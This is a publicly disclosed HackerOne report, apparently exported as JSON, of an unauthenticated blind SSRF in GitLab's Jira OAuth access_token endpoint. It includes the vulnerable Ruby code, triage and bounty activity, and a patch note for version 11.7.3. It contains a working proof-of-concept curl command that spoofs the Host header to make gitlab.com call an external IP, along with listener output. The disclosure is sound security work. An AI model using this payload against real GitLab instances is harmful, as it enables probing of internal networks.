{"id":398799,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTg3OTk=","url":"https://hackerone.com/reports/398799","title":"Unauthenticated blind SSRF in OAuth Jira authorization controller","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-08-24T03:05:22.400Z","submitted_at":"2018-08-24T03:05:22.400Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jobert","url":"/jobert","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-03-14T16:28:39.097Z","bug_reporter_agreed_on_going_public_at":"2019-02-12T16:28:38.692Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The `Oauth::Jira::AuthorizationsController#access_token` endpoint is vulnerable to a blind SSRF vulnerability. The vulnerability allows an attacker to make arbitrary HTTP/HTTPS requests inside a GitLab instance's network.\n\n# Proof of concept\nTo reproduce the vulnerability, follow the steps below.\n\n - spin up a GitLab EE instance with the latest version (11.2.1-ee)\n - send a `POST` request to the `/-/jira/login/oauth/callback` endpoint, as shown below. In the request, point the `Host` header to the hostname / IP address and port number you want to send the request to:\n\n```\ncurl -X POST -H 'Host: 162.243.147.21:81' 'https://gitlab.com/-/jira/login/oauth/access_token'\n```\n\n - Observe a `POST` request being sent to `162.243.147.21:81` (in this case HTTPS):\n\n```\nListening on [0.0.0.0] (family 0, port 81)\nConnection from [35.231.137.154] port 81 [tcp/*] accepted (family 2, sport 58558)\n��ؒ����\n��/$����4�i�,�֟J%\u003e�+�/�,�0�����#�'�\t��$�(�\n�gk39@j28��\u003c=/5�l162.243.147.21\n\n Connection closed, listening again.\n```\n\n# Vulnerable code\nThe following code can be found in the `Oauth::Jira::AuthorizationsController#access_token` method.\n\n```ruby\ndef access_token\n  auth_params = params\n                  .slice(:code, :client_id, :client_secret)\n                  .merge(grant_type: 'authorization_code', redirect_uri: oauth_jira_callback_url)\n\n  auth_response = Gitlab::HTTP.post(oauth_token_url, body: auth_params, allow_local_requests: true)\n  token_type, scope, token = auth_response['token_type'], auth_response['scope'], auth_response['access_token']\n\n  render text: \"access_token=#{token}\u0026scope=#{scope}\u0026token_type=#{token_type}\"\nend\n```\n\nThe `GItlab::HTTP.post` call is using the `oauth_token_url` directly. This `_url` Rails routing helper uses the `Host` header to construct the URL it needs to point to. Because every host is accepted in GitLab, the constructed URL can point to an internal system. This is how it's supposed to work. However, the `Host` header should be checked before making the `post` call to avoid an attacker being able to make arbitrary requests.\n\n## Impact\n\nThe response of the server is actually interpreted, but this is limited to a JSON response that returns an `access_token`, `scope`, and `token_type`. However, this may have additional consequences in case there are unauthenticated endpoints within the instance's network. This isn't very likely, which is why the attack complexity is set to High. It has a minor impact on Availability, because a thread is blocked on the TCP read timeout, which is set to 60 seconds (`curl -X POST -H 'Host: 162.243.147.21:81'   0.03s user 0.01s system 0% cpu 1:00.76 total`). The integrity impact is currently set at High, but this depends on additional factors, such as what other internal services can be hit. The user does not need to be authenticated to execute the call.","vulnerability_information_html":"\u003cp\u003eThe \u003ccode\u003eOauth::Jira::AuthorizationsController#access_token\u003c/code\u003e endpoint is vulnerable to a blind SSRF vulnerability. The vulnerability allows an attacker to make arbitrary HTTP/HTTPS requests inside a GitLab instance\u0026#39;s network.\u003c/p\u003e\n\n\u003ch1 id=\"proof-of-concept\"\u003eProof of concept\u003c/h1\u003e\n\n\u003cp\u003eTo reproduce the vulnerability, follow the steps below.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003espin up a GitLab EE instance with the latest version (11.2.1-ee)\u003c/li\u003e\n\u003cli\u003esend a \u003ccode\u003ePOST\u003c/code\u003e request to the \u003ccode\u003e/-/jira/login/oauth/callback\u003c/code\u003e endpoint, as shown below. In the request, point the \u003ccode\u003eHost\u003c/code\u003e header to the hostname / IP address and port number you want to send the request to:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -X POST -H \u0026#39;Host: 162.243.147.21:81\u0026#39; \u0026#39;https://gitlab.com/-/jira/login/oauth/access_token\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eObserve a \u003ccode\u003ePOST\u003c/code\u003e request being sent to \u003ccode\u003e162.243.147.21:81\u003c/code\u003e (in this case HTTPS):\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eListening on [0.0.0.0] (family 0, port 81)\nConnection from [35.231.137.154] port 81 [tcp/*] accepted (family 2, sport 58558)\n��ؒ����\n��/$����4�i�,�֟J%\u0026gt;�+�/�,�0�����#�\u0026#39;�    ��$�(�\n�gk39@j28��\u0026lt;=/5�l162.243.147.21\n\n Connection closed, listening again.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"vulnerable-code\"\u003eVulnerable code\u003c/h1\u003e\n\n\u003cp\u003eThe following code can be found in the \u003ccode\u003eOauth::Jira::AuthorizationsController#access_token\u003c/code\u003e method.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eaccess_token\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eauth_params\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eparams\u003c/span\u003e\n                  \u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eslice\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"ss\"\u003e:code\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003e:client_id\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003e:client_secret\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n                  \u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003emerge\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"ss\"\u003egrant_type: \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;authorization_code\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003eredirect_uri: \u003c/span\u003e\u003cspan class=\"n\"\u003eoauth_jira_callback_url\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n  \u003cspan class=\"n\"\u003eauth_response\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eGitlab\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eoauth_token_url\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003ebody: \u003c/span\u003e\u003cspan class=\"n\"\u003eauth_params\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003eallow_local_requests: \u003c/span\u003e\u003cspan class=\"kp\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003etoken_type\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003escope\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etoken\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eauth_response\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;token_type\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eauth_response\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;scope\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eauth_response\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;access_token\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\n  \u003cspan class=\"n\"\u003erender\u003c/span\u003e \u003cspan class=\"ss\"\u003etext: \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;access_token=\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"n\"\u003etoken\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026amp;scope=\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"n\"\u003escope\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026amp;token_type=\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"n\"\u003etoken_type\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003eGItlab::HTTP.post\u003c/code\u003e call is using the \u003ccode\u003eoauth_token_url\u003c/code\u003e directly. This \u003ccode\u003e_url\u003c/code\u003e Rails routing helper uses the \u003ccode\u003eHost\u003c/code\u003e header to construct the URL it needs to point to. Because every host is accepted in GitLab, the constructed URL can point to an internal system. This is how it\u0026#39;s supposed to work. However, the \u003ccode\u003eHost\u003c/code\u003e header should be checked before making the \u003ccode\u003epost\u003c/code\u003e call to avoid an attacker being able to make arbitrary requests.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThe response of the server is actually interpreted, but this is limited to a JSON response that returns an \u003ccode\u003eaccess_token\u003c/code\u003e, \u003ccode\u003escope\u003c/code\u003e, and \u003ccode\u003etoken_type\u003c/code\u003e. However, this may have additional consequences in case there are unauthenticated endpoints within the instance\u0026#39;s network. This isn\u0026#39;t very likely, which is why the attack complexity is set to High. It has a minor impact on Availability, because a thread is blocked on the TCP read timeout, which is set to 60 seconds (\u003ccode\u003ecurl -X POST -H \u0026#39;Host: 162.243.147.21:81\u0026#39;   0.03s user 0.01s system 0% cpu 1:00.76 total\u003c/code\u003e). The integrity impact is currently set at High, but this depends on additional factors, such as what other internal services can be hit. The user does not need to be authenticated to execute the call.\u003c/p\u003e\n","bounty_amount":"4000.0","formatted_bounty":"$4,000","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-03-14T16:28:38.859Z","allow_singular_disclosure_after":-56640157.036611706,"singular_disclosure_allowed":true,"vote_count":214,"voters":["notpwnguy","sultancad","mashoud1122","0xbeefed","spam404","base_64","leetboi","yamcha","sameerphad72","e4366eolywrgpidfbio","and 204 more..."],"severity":{"rating":"high","score":7.5,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"none","integrity":"high","availability":"low"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3253075,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-27T14:56:09.197Z","updated_at":"2018-08-27T14:56:09.197Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3290635,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jobert ,\n\nThank you for submitting this report. I've validated that this is an SSRF issue. We are working internally on resolving the issue at https://gitlab.com/gitlab-org/gitlab-ce/issues/50748. We are working to get this patched immediately.\n\nThe issue will be made public 30 days after a patch has been released. We will keep you updated on our progress via HackerOne.\n\nBest regards,\nJames","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jobert\"\u003e@jobert\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report. I\u0026#39;ve validated that this is an SSRF issue. We are working internally on resolving the issue at \u003ca title=\"https://gitlab.com/gitlab-org/gitlab-ce/issues/50748\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-ce%2Fissues%2F50748\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab-ce/issues/50748\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. We are working to get this patched immediately.\u003c/p\u003e\n\n\u003cp\u003eThe issue will be made public 30 days after a patch has been released. We will keep you updated on our progress via HackerOne.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJames\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-04T16:17:57.143Z","updated_at":"2018-09-04T16:17:57.143Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3463426,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-11T03:08:55.097Z","updated_at":"2018-10-11T03:08:55.097Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"4000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"jobert","url":"/jobert"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4127991,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @jobert,\n\nThank you again for the report! Your finding has been patched in GitLab version 11.7.3 and we have awarded a bounty. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nSecurity Team | GitLab Inc.\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jobert\"\u003e@jobert\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you again for the report! Your finding has been patched in GitLab version 11.7.3 and we have awarded a bounty. Congratulations!\u003c/p\u003e\n\n\u003cp\u003ePlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab\u0026#39;s issue tracker.\u003c/p\u003e\n\n\u003cp\u003eWe look forward to your next report!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nSecurity Team | GitLab Inc.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-11T13:01:22.049Z","updated_at":"2019-02-11T13:01:22.049Z","actor":{"username":"estrike","cleared":false,"url":"/estrike","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"jobert","url":"/jobert"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4136589,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-12T16:28:38.734Z","updated_at":"2019-02-12T16:28:38.734Z","first_to_agree":true,"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4323858,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-14T16:28:39.127Z","updated_at":"2019-03-14T16:28:39.127Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}